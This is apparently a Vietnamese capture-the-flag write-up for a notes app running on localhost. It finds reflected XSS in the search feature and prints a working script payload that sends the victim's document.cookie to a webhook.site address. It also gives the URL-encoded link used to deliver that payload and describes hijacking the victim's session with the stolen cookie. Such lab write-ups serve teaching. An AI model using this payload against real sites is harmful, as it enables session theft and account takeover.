# HTML Injection 1

## Thử thách về lỗi bảo mật HTML Injection

## Mục tiêu: Đọc note của nạn nhân

## Note: Bạn có thể gửi link cho nạn nhân qua
# Phân tích
Đây là 1 web có chức năng ghi chú, và cho phép tìm kiếm lại ghi chú.  
Thử chức năng tìm kiếm có bị xss không:
```
<script>alert("XSS")</script>
```
Có hoạt động --> lỗi xss.
Muốn đọc các ghi chú, tìm cách lấy `document.cookie` của nạn nhận
```
<script>new Image().src="https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?cookie="+document.cookie</script>
```
ở đây có sử dụng [webhook](https://webhook.site) để nhận thông tin 
<img src='./img/Screenshot 2025-08-05 at 23.30.26.png'>  

Thành công vs playload trên.
Play load gửi cho nạn nhận có dạnh:
```
http://localhost:13001/search?q=%3Cscript%3Enew+Image%28%29.src%3D%22https%3A%2F%2Fwebhook.site%2F15665075-b653-4dc7-bdc2-10b1ace815cf%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E
```
# Khai thác
Sau khi gửi ta nhận được cookie, tiến hành thay đổi cookie trên `browser` để lấy session của nạn nhận hiện tại và vào đọc các ghi chú.
<img src='./img/Screenshot 2025-08-05 at 23.15.18.png'>